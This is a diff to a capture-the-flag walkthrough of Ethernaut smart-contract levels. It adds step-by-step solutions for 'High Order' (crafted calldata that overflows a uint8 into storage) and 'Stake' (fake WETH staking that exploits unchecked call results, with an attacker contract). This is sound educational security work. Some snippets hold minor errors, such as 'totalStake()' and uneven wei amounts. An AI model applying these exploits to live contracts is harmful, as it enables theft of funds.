@@ -33,6 +33,8 @@ If you want to do the same, I recommend that you try to solve the levels on your
 28. [Level 27: Good Samaritan](#level-27-good-samaritan)
 29. [Level 28: Gaatekeeper Three](#level-28-gatekeeper-three)
 30. [Level 29: Switch](#level-29-switch)
+31. [Level 30: High Order](#level-30-high-order)
+32. [Level 31: Stale](#"level-31-stake")
 
 ## Level 0: Intro <a name="level-0-intro"></a>
 
@@ -2360,7 +2362,7 @@ From the level:
 >
 >Furthermore, iterating over operations that consume ETH can lead to issues if it is not handled correctly. Even if ETH is spent, msg.value will remain the same, so the developer must manually keep track of the actual remaining amount on each iteration. This can also lead to issues when using a multi-call pattern, as performing multiple delegatecalls to a function that looks safe on its own could lead to unwanted transfers of ETH, as delegatecalls keep the original msg.value sent to the contract.
 
-## Level 25: Motorbike <a name="level-25-motorbike">
+## Level 25: Motorbike <a name="level-25-motorbike"></a>
 
 As always, let's have a look at the contract first:
 
@@ -2653,7 +2655,7 @@ Here the transaction where we exploited it: [Exploit Success](https://holesky.et
 Do not leave your logic contract uninitialized. Always make sure that the
 contract is properly initialized.
 
-## Level 26: DoubleEntryPoint <a name="level-26-double-entry-point">
+## Level 26: DoubleEntryPoint <a name="level-26-double-entry-point"></a>
 
 Let's have a look at the contracts first:
 
@@ -2845,7 +2847,7 @@ Register it and we are done :)
 
 >Having tokens that present a double entry point is a non-trivial pattern that might affect many protocols. This is because it is commonly assumed to have one contract per token. But it was not the case this time :) You can read the entire details of what happened [here](https://blog.openzeppelin.com/compound-tusd-integration-issue-retrospective).
 
-## Level 27: Good Samaritan <a name="level-27-good-samaritan">
+## Level 27: Good Samaritan <a name="level-27-good-samaritan"></a>
 
 Let's have a look at the contract first:
 
@@ -3015,7 +3017,7 @@ Deploy and provide the address of the GoodSamaritan contract and we are done :)
 >contract further down in the call chain can declare the same error and throw it
 >at an unexpected location, such as in the notify(uint256 amount) function in your attacker contract.
 
-## Level 28: Gaatekeeper Three <a name="level-28-gatekeeper-three">
+## Level 28: Gaatekeeper Three <a name="level-28-gatekeeper-three"></a>
 
 Another day for a hack :) Let's have a look at the contract first:
 
@@ -3239,7 +3241,7 @@ And we are an entrant of the `GatekeeperThree` contract :)
 Not sure what new stuff we learned here, but it is always good to see how
 contracts can be exploited and practice our skills :)
 
-## Level 29: Switch <a name="level-29-switch">
+## Level 29: Switch <a name="level-29-switch"></a>
 
 Let's have a look at the contract first:
 
@@ -3356,3 +3358,269 @@ await contract.switchOn() -> true
 From the level itself:
 
 > Assuming positions in CALLDATA with dynamic types can be erroneous, especially when using hard-coded CALLDATA positions.
+
+## Level 30: High Order <a name="level-30-high-order"></a>
+
+As always, let's have a look at the contract first:
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.6.12;
+
+contract HigherOrder {
+    address public commander;
+
+    uint256 public treasury;
+
+    function registerTreasury(uint8) public {
+        assembly {
+            sstore(treasury_slot, calldataload(4))
+        }
+    }
+
+    function claimLeadership() public {
+        if (treasury > 255) commander = msg.sender;
+        else revert("Only members of the Higher Order can become Commander");
+    }
+}
+```
+
+Our objective is to become the commander of the contract. The `claimLeadership`
+function checks if the `treasury` variable is greater than 255. If it is, the
+`commander` variable is set to the address of the caller.
+
+The `treasury` variable is set in the `registerTreasury` function. The `registerTreasury`
+takes one `uint8` parameter and stores it in the `treasury` variable. At the same
+time it uses inline assembly to store 32 bytes from calldata from offset 4 in the
+storage slot of the `treasury`variable.
+
+What does that mean? Based on the knowledge we have from the previous levels,
+the first 4 bytes of the calldata contain the function signature, here
+`registerTreasury(uint8)`. The next 32 bytes contain the parameter of the function,
+which is the `uint8` value.
+
+Let's have a look at it by sending a transaction:
+
+```
+await contract.registerTreasury(1)
+await web3.eth.getTransaction(<take the hash>)
+```
+and look at the input field:
+
+```
+0x211c85ab0000000000000000000000000000000000000000000000000000000000000001
+```
+We can see that the first 4 bytes ar ethe function signature and the remaining
+32 bytes hold our value :)
+
+So, how are we going to be able to set the `treasury` variable to a value greater
+than 255? The `uint8` type can hold values from 0 to 255. That means, we have
+to set the `treasury` variable to 256 or greater.
+
+Let's just build our own input:
+
+```
+0x211c85ab00000000000000000000000000000000000000000000000000000000deadbeef
+```
+
+and send the transaction:
+
+```javascript
+await web3.eth.sendTransaction({from: player, to: contract.address, input: "0x211c85ab00000000000000000000000000000000000000000000000000000000deadbeef"})
+```
+
+hit enter and wait :) Once it is in the blockchain, let's have a look at the 
+`treasury` variable:
+
+```javascript
+await contract.treasury().then(v => v.toString()) => '3735928559' 
+```
+
+Time to claim the leadership:
+
+```javascript
+await contract.claimLeadership()
+```
+
+And we are the master of the universe, well at least of the contract :)
+
+### Learning
+
+Even the function signature tells you that the parameter is of type `uint8`, it
+does not mean that you can't provide a value greater than 255. The checks are
+coming from the code which wraps the contract functions for you, but bits
+and bytes are bits and bytes :)
+
+## Level 31: Stake <a name="level-31-stake"></a>
+
+Time to crack some Defi contract ;)
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+contract Stake {
+
+    uint256 public totalStaked;
+    mapping(address => uint256) public UserStake;
+    mapping(address => bool) public Stakers;
+    address public WETH;
+
+    constructor(address _weth) payable{
+        totalStaked += msg.value;
+        WETH = _weth;
+    }
+
+    function StakeETH() public payable {
+        require(msg.value > 0.001 ether, "Don't be cheap");
+        totalStaked += msg.value;
+        UserStake[msg.sender] += msg.value;
+        Stakers[msg.sender] = true;
+    }
+    function StakeWETH(uint256 amount) public returns (bool){
+        require(amount >  0.001 ether, "Don't be cheap");
+        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
+        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
+        totalStaked += amount;
+        UserStake[msg.sender] += amount;
+        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
+        Stakers[msg.sender] = true;
+        return transfered;
+    }
+
+    function Unstake(uint256 amount) public returns (bool){
+        require(UserStake[msg.sender] >= amount,"Don't be greedy");
+        UserStake[msg.sender] -= amount;
+        totalStaked -= amount;
+        (bool success, ) = payable(msg.sender).call{value : amount}("");
+        return success;
+    }
+    function bytesToUint(bytes memory data) internal pure returns (uint256) {
+        require(data.length >= 32, "Data length must be at least 32 bytes");
+        uint256 result;
+        assembly {
+            result := mload(add(data, 0x20))
+        }
+        return result;
+    }
+}
+```
+
+Our objectives:
+
+ * The contract Eth balance has to be > 0
+ * `totalStaked` must be greater than the contract's ETH balance
+ * You must be a staker
+ * Your stake balance must be 0
+
+Let's have at the functions and see if there is a way to exploit it.
+
+Let's start with the `StakeETH` function. The function requires that the caller
+sends more than `0.001` Eth. The function increases the `totalStaked` variable
+by the amount of Eth sent, increases the `UserStake` variable of the caller by
+the amount of Eth sent and sets the `Stakers` mapping of the caller to true.
+
+Seems all fine so far. No calls to other contracts, no overflow to be spotted,
+let's continue.
+
+Let's continue with `Unstake`. The function requires that the caller has a stake
+greater than the amount of Eth to be unstaked. The function decreases the `UserStake`
+variable of the caller by the amount of Eth to be unstaked, decreases the `totalStaked`
+variable by the amount of Eth to be unstaked and sends the amount of Eth to the
+caller. After that it returns the boolean value of the success of the transaction.
+
+Funnily it does not check if the call has been successful - aha. Don't forget that :)
+
+Now, let's have a look at the `StakeWETH` function. The function requires that
+the amount of Eth to be staked is greater than `0.001` Eth. The function calls
+the `WETH` contract with the `0xdd62ed3e` selector and the address of the caller
+and the address of the contract. It checks if the contract has an allowance from
+us. If it has, it increases the `totalStaked` variable by the amount of Eth to
+be staked, increases the `UserStake` variable of the caller by the amount of Eth
+to be staked, calls the `WETH` contract with the `0x23b872dd` selector
+([transferFrom](https://www.4byte.directory/signatures/?bytes4_signature=0x23b872dd)),
+the address of the caller, the address of the contract and the amount of Eth to
+be staked and sets the `Stakers` mapping of the caller to true.
+
+Again, it does not check if the call has been successful.
+
+Let's think what can be done.
+
+We as a player can give the contract an allowance from the `WETH` contract
+(0.001 WETH as an example), even we do not have any, since the contract tries
+to transfer the amount of Eth from the `WETH` contract to the contract but
+won't check if it was actually successful.
+
+With this, we would be able to become a staker and set the `totalStaked`
+variable would be `0.001`, which is greater than the balance of the contract.
+
+If we unstake everything, the `totalStaked` variable would be set to 0, so
+we would need to simulate another staker, which would stake `0.001` Eth.
+That means that the balance of the contract is `0.001` Eth and the `totalStaked`
+variable is `0.002` Eth.
+
+Let's give the simulated user an additional Wei to stake, since we need to leave
+some balance on the contract.
+
+I believe that this should be all. Let's give it a try.
+
+First, we are going to `approve` `0.001` Eth  + 1 Wei for the Stake contract in
+the WETH contract. The 1 Wei is because the require statement asks from us to 
+deposit more than `0.001` WEth.
+
+For this, we are going to have an interface in remix, use the
+address from `contract.WETH()` and call the `approve` function with the address
+of the Stake contract and `0.001` Eth + `1` Wei.
+
+```solidity
+interface WETH {
+    function approve(address spender, uint256 amount) external returns (bool);
+}
+```
+Now time to stake some WETH :)
+
+```javascript
+await contract.StakeWETH(1000000000000001)
+await contract.totalStake() //=> '1000000000000001' good
+await web3.eth.getBalance(contract.address) //=> '0' good
+```
+
+Good, now we are going to stake our Eth :)
+
+```javascript
+await contract.StakeETH({value: 1000000000000001})
+await contract.totalStake() //=> '2000000000000002' good
+await web3.eth.getBalance(contract.address) //=> '1000000000000001' good
+```
+
+Good, now we are going to create a fake user, who is going to stake
+`0.001 Eth + 1 Wei` Eth
+
+```solidity
+interface Stake {
+    function StakeETH() external payable;
+}
+
+contract FakeStaker {
+
+    function sexyStaky(address _stake) external payable {
+        // Become a staker with 0.001 ETH + 2 wei (1 will be left behind)
+        Stake(_stake).StakeETH{value: msg.value}();
+    }
+}
+```
+
+Deploy and send `0.001 Eth + 2 Wei` to the `sexyStaky` function.
+
+Alright, time to `Unstake` everything using your player's address.
+
+```javascript
+await contract.Unstake(2000000000000002)
+```
+
+And we are done :)
+
+### Learning
+
+When you do calls to other contracts, always check if the call has been successful.
+If you do not check, you might end up in a situation where you think you have
+done something, but in reality, you haven't.
